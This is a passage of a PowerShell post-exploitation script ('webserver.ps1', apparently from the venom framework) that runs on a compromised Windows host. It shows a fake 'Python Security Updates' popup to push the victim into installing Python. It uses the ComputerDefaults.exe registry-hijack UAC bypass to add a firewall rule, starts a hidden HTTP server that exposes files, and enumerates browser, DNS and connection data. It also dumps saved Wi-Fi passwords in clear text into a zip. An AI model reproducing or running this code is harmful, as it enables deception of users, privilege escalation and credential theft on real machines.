      Write-Host "[Auto] Activate : -SForce 2 parameter to use powershell Start-BitsTransfer" -ForeGroundColor Yellow;Start-Sleep -Seconds 2
   }
}


If($SForce -gt 0){
$i = 0 ## Loop counter
$Success = $False ## Python installation status

   <#
   .SYNOPSIS
      parameter: -SForce 2 -STime 26
      force remote user to execute the python windows installer
      (2 attempts) and use 30 Seconds between install attempts.
      Author: @r00t-3xp10it (venom Social Engineering Function)

   .DESCRIPTION
      This parameter forces the installation of python-3.9.0.exe
      by looping between python-3.9.0.exe executions until python
      its installed OR the number of attempts set by user in -SForce
      parameter its reached. Example of how to to force the install
      of python in remote host 3 times: .\webserver.ps1 -SForce 3

   .NOTES
      'Its the syntax that gives us more guarantees of success'.
      This function uses powershell Start-BitsTransfer cmdlet to
      download python-3.9.0.exe before remote execute the installer
   #>

   ## Loop Function (Social Engineering)
   # Hint: $i++ increases the nÃ‚Âº of the $i counter
   Do {
       $check = cmd /c python --version
       ## check target host python version
       If(-not($check) -or $check -ieq $null){
           $i++;Write-Host "[$i] Python Installation: not found." -ForeGroundColor Red -BackgroundColor Black
           ## Test if installler exists on remote directory
           If(Test-Path "$Env:TMP\$BinName"){
              Write-Host "[$i] python windows installer: found.";Start-Sleep -Seconds 1
              If($HiddeMsgBox -ieq $False){
                  Write-Host "[$i] Remote Spawning Social Engineering MsgBox.";Start-Sleep -Seconds 1
                  powershell (NeW-ObjeCt -ComObjEct Wscript.Shell).Popup("Python Security Updates Available.`nDo you wish to Install them now?",15,"$Server_hostName - $BinName setup",4+48)|Out-Null;
                  $HiddeMsgBox = $True
              }
              ## Execute python windows installer
              powershell Start-Process -FilePath "$Env:TMP\$BinName" -Wait
              Start-Sleep -Seconds $STime; # 16+4 = 20 seconds between executions (default value)
           }Else{
              ## python windows installer not found, download it ..
              Write-Host "[$i] python windows installer: not found." -ForeGroundColor Red -BackgroundColor Black;Start-Sleep -Seconds 1
              Write-Host "[$i] Downloading: $Env:TMP\$BinName" -ForeGroundColor Red -BackgroundColor Black;Start-Sleep -Seconds 2
              powershell Start-BitsTransfer -priority foreground -Source https://www.python.org/ftp/python/3.9.0/$BinName -Destination $Env:TMP\$BinName
           }
        ## Python Successfull Installed ..
        # Mark $Success variable to $True to break SE loop
        }Else{
           $i++;Write-Host "[$i] Python Installation: found."
           Start-Sleep -Seconds 2;$Success = $True
        }
   }
   ## DO Loop UNTIL $i (Loop set by user or default value counter) reaches the
   # number input on parameter -SForce OR: if python is $success=$True (found).
   Until($i -eq $SForce -or $Success -ieq $True)
}


$Installation = cmd /c python --version
## Make Sure python http.server requirement its satisfied.
If(-not($Installation) -or $Installation -ieq $null){
   write-host "[Abort] This cmdlet cant find python installation." -ForeGroundColor Red -BackgroundColor Black;Start-Sleep -Seconds 1
   write-host "[Force] the installation of python: .\webserver.ps1 -SForce 10 -STime 26 -SEnum Verbose" -ForeGroundColor Yellow;write-host "";Start-Sleep -Seconds 2
   exit ## Exit @webserver

}Else{

   write-host "All Python requirements are satisfied." -ForeGroundColor DarkGreen
   If(-not($SBind) -or $SBind -ieq $null){
      ## Grab remote target IPv4 ip address (to --bind)
      $Remote_Host = (Test-Connection -ComputerName (hostname) -Count 1 -ErrorAction SilentlyContinue).IPV4Address.IPAddressToString
   }Else{
      ## Use the cmdlet -SBind parameter (to --bind)
      $Remote_Host = "$SBind"
   }
   
   ## @shanty debug report under: windows 10 PRO
   # Add Firewall Rule (silent) to prevent python (server) connection warnings (admin privs)
   # IF the shell does not have admin privs, then ComputerDefaults.exe EOP will be used to add the rule.
   $PythonPath = (Get-ChildItem -Path $Env:PROGRAMFILES, ${Env:PROGRAMFILES(x86)}, $Env:LOCALAPPDATA\Programs -Filter python.exe -Recurse -ErrorAction SilentlyContinue -Force).fullname|findstr /V "\Lib"
   If(-not($LASTEXITCODE -eq 0)){# Use cmd.exe 'dir' command insted of PS 'Get-ChildItem' to find python path
      $SearchPath = cmd /c dir /B /S $Env:PROGRAMFILES, ${Env:PROGRAMFILES(x86)}, $Env:LOCALAPPDATA\Programs|Select-String -Pattern "python.exe"|findstr /V "\Lib \Microsoft"
      If(-not($LASTEXITCODE -eq 0)){# Use python interpreter to find the python path
         $SearchPath = python -c "import os, sys; print(os.path.dirname(sys.executable))"
         $PythonPath = "$SearchPath"+"\python.exe"
      }Else{
         $PythonPath = $SearchPath|Where {$_ -ne ''}
      }
   }

   $IsClientAdmin = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -Match "S-1-5-32-544");
   If($IsClientAdmin){# Check if rule allready exists on remote firewall
      netsh advfirewall firewall show rule name="python.exe"|Out-Null
      If(-not($LASTEXITCODE -eq 0)){
         write-host "[bypass] Adding python.exe firewall rule." -ForeGroundColor Yellow
         netsh advfirewall firewall add rule name="python.exe" description="venom v1.0.17 - python (SE) webserver" program="$PythonPath" dir=in action=allow protocol=TCP enable=yes|Out-Null
      }
   }Else{
      ## Shell (webserver) running under UserLand privs
      # Check if rule allready exists on remote firewall
      netsh advfirewall firewall show rule name="python.exe"|Out-Null
      If(-not($LASTEXITCODE -eq 0)){# Use ComputerDefaults EOP to add rule to remote firewall
         write-host "[bypass] Using EOP technic to add firewall rule." -ForeGroundColor Yellow
         $Command = "netsh advfirewall firewall add rule name=`"python.exe`" description=`"venom v1.0.17 - python (SE) webserver`" program=`"$PythonPath`" dir=in action=allow protocol=TCP enable=yes"
         ## Adding to remote regedit the 'ComputerDefaults' hijacking keys (EOP - UAC Bypass - UserLand)
         New-Item "HKCU:\Software\Classes\ms-settings\shell\open\Command" -Force -EA SilentlyContinue|Out-Null
         Set-ItemProperty "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value '' -Force|Out-Null
         Set-ItemProperty "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "(Default)" -Value "$Command" -Force|Out-Null
         Start-Process -WindowStyle hidden "$Env:WINDIR\System32\ComputerDefaults.exe" -Wait
         Remove-Item "HKCU:\Software\Classes\ms-settings\shell" -Recurse -Force|Out-Null
      }
   }

   <#
   .SYNOPSIS
      Start python http server on sellect Ip/Path/Port

   .DESCRIPTION
      Start python http server on a new process (orphan) detach
      from parent process (powershell => webserver) and store the
      started python process PID to allow multiple server sessions.
   #>

   Start-Process -WindowStyle hidden python -ArgumentList "-m http.server", "--directory $Server_Working_Dir", "--bind $Remote_Host", "$Remote_Server_Port" -ErrorAction SilentlyContinue|Out-Null
   If($? -ieq $True){write-host "Serving HTTP on http://${Remote_Host}:${Remote_Server_Port}/ on directory '$Server_Working_Dir'" -ForeGroundColor DarkGreen
      $ServerTime = Get-Date -Format 'HH:mm:ss';write-host ""
      $PIDS = Get-Process python -ErrorAction SilentlyContinue|Select-Object -ExpandProperty Id|Select -Last 1
      echo "$PIDS  $ServerTime   $Remote_Host  $Remote_Server_Port  $Server_Working_Dir" >> $Env:TMP\sessions.log
   }Else{
      write-host "[fail] Executing the @webserver with errorcode $LASTEXITCODE" -ForeGroundColor Red -BackgroundColor Black
      write-host "";Start-Sleep -Seconds 1
   }


   ## WebBrowser Enumeration (-SEnum True|Verbose)
   If($SEnum -ieq "True" -or $SEnum -ieq "Verbose"){

      <#
      .SYNOPSIS
         Remote Host Web Browser Enumeration

      .DESCRIPTION
         Remote Host Web Browser Enumeration, DNS Records, DHCP
         User-Agent, Default Browser, TCP Headers, MainWindowTitle
         Wifi Stored cRedentials (ZIP archive), Anti-Virus status.

      .EXAMPLE
         PS C:\> .\webserver.ps1 -SEnum True
         Remote Host Web Browser Default Enumeration ..

      .EXAMPLE
         PS C:\> .\webserver.ps1 -SEnum Verbose
         @webserver agressive (verbose) enumeration module
      #>

      ## Internal Variable Declarations
      $SSID = (Get-WmiObject Win32_OperatingSystem).Caption
      $OsVersion = (Get-WmiObject Win32_OperatingSystem).Version
      $Remote_Host = (Test-Connection -ComputerName (hostname) -Count 1 -ErrorAction SilentlyContinue).IPV4Address.IPAddressToString
      $recon_age = Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\internet settings" -Name 'User Agent' -ErrorAction SilentlyContinue|Select-Object -ExpandProperty 'User Agent'
      $IsClientAdmin = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -Match "S-1-5-32-544");If($IsClientAdmin){$report = "Administrator"}Else{$report = "UserLand"}
      $DefaultBrowser = (Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\Shell\Associations\UrlAssociations\https\UserChoice' -ErrorAction SilentlyContinue).ProgId
      If($DefaultBrowser){$Parse_Browser_Data = $DefaultBrowser.split("-")[0] -replace 'URL','' -replace 'HTML','' -replace '.HTTPS',''}else{$Parse_Browser_Data = "Not Found"}
      $BrowserPath = Get-Process $Parse_Browser_Data -ErrorAction SilentlyContinue|Select -Last 1|Select-Object -Expandproperty Path
      $Browserversion = Get-Process $Parse_Browser_Data -ErrorAction SilentlyContinue|Select -Last 1|Select-Object -Expandproperty ProductVersion
      $Storedata = Get-Process $Parse_Browser_Data -ErrorAction SilentlyContinue|Select -ExpandProperty MainWindowTitle
      $ActiveTabName = $Storedata|Where {$_ -ne ""}

         ## WebBrowser Headers Enumeration (pure powershell)
         $Url = "http://${Remote_Host}:${Remote_Server_Port}/"
         $request = [System.Net.WebRequest]::Create( $Url )
         $headers = $request.GetResponse().Headers
         $headers.AllKeys |
            Select-Object @{ Name = "Key"; Expression = { $_ }},
            @{ Name = "Value"; Expression = { $headers.GetValues( $_ ) } }

            ## Capture python http web page title (Invoke-WebRequest)
            $Site = Invoke-WebRequest $url;$WebContent = $Site.Content|findstr "title"
            $WebTitle = $WebContent -replace '<title>','' -replace '</title>',''

         ## Build Output Table
         Write-Host "Enumeration"
         write-host "-----------"
         write-host "Shell Privs      : $report"
         write-host "Remote Host      : $Remote_Host"
         Write-Host "LogonServer      : ${Env:USERDOMAIN}\\${Env:USERNAME}"
         write-host "OS version       : $OsVersion"
         write-host "DefaultBrowser   : $Parse_Browser_Data ($Browserversion)"
         write-host "OperatingSystem  : $SSID"
         write-host "User-Agent       : $recon_age"
         write-host "WebBrowserPath   : $BrowserPath"
         write-host "ActiveTabName    : $ActiveTabName"
         write-host "WebServerTitle   : $WebTitle`n"

      echo "`nConnection Status" > $Env:TMP\logfile.log
      echo "-----------------" >> $Env:TMP\logfile.log
      echo "  Proto  Local Address          Foreign Address        State           PID" >> $Env:TMP\logfile.log
      cmd /c netstat -ano|findstr "${Remote_Host}:${Remote_Server_Port}"|findstr "LISTENING ESTABLISHED" >> $Env:TMP\logfile.log
      echo "" >> $Env:TMP\logfile.log
      echo "Established Connections" >> $Env:TMP\logfile.log
      echo "-----------------------" >> $Env:TMP\logfile.log
      echo "  Proto  Local Address          Foreign Address        State           PID" >> $Env:TMP\logfile.log
      cmd /c netstat -ano|findstr "ESTABLISHED"|findstr /V "::"|findstr /V "["|findstr /V "UDP" >> $Env:TMP\logfile.log
      Get-Content $Env:TMP\logfile.log;Remove-Item $Env:TMP\logfile.log -Force

      ## @weberver active sessions List
      Write-Host "`nSession  Pid   StartTime  Bind          Port  Directory"
      Write-Host "-------  ---   ---------  ----          ----  ---------"
      If(Test-Path "$Env:TMP\sessions.log"){
         foreach($KeyId in Get-Content "$Env:TMP\sessions.log"){
            $Count++;Start-Sleep -Milliseconds 700
            Write-Host "  $Count      $KeyId"
         }
      }

      If($SEnum -ieq "Verbose"){
         ## @Webserver Working dir ACL Description
         Write-Host "`nWorking Directory (ACL)"
         Write-Host "-----------------------"
         $GetACLDescription = icacls "$Server_Working_Dir"|findstr /V "processing"
         echo $GetACLDescription > $Env:TMP\ACl.log;Get-Content -Path "$Env:TMP\ACL.log"
         Remove-Item -Path "$Env:TMP\ACl.log" -Force
      }

      ## Enumeration Verbose module
      If($SEnum -ieq "Verbose"){

         ## List Remote-Host DNS entrys
         $GetDnsData = Get-DNSClientCache|Select-Object Entry,Data|Format-Table -AutoSize
         echo $GetDnsData > $Env:TMP\dns.log;Get-Content -Path "$Env:TMP\dns.log"
         Remove-Item -Path "$Env:TMP\dns.log" -Force

         ## Dump SSID passwords into a zip file
         $DumpFolder = "SSIDump";$DumpFile = "SSIDump.zip"
         If(-not(Test-Path "$Env:TMP\$DumpFolder")){New-Item "$Env:TMP\$DumpFolder" -ItemType Directory -Force|Out-Null}
         netsh wlan export profile folder=$Env:TMP\$DumpFolder key=clear|Out-Null
         Compress-Archive -Path "$Env:TMP\$DumpFolder" -DestinationPath "$Env:TMP\SSIDump.zip" -Force

         ## Build Table Output
         Write-Host "WiFi SSID password dump"
         Write-Host "-----------------------"
         Write-Host "$Env:TMP\SSIDump.zip";Start-Sleep -Seconds 1
         Remove-Item "$Env:TMP\$DumpFolder" -Recurse -Force|Out-Null

      }
   }
}

Write-Host ""
## Final Notes:
# The 'cmd /c' syscall its used in certain ocasions in this cmdlet only because
# it produces less error outputs in terminal prompt compared with PowerShell.
If(Test-Path "$Env:TMP\$BinName"){Remove-Item "$Env:TMP\$BinName" -Force}
Start-Sleep -Seconds 1
exit

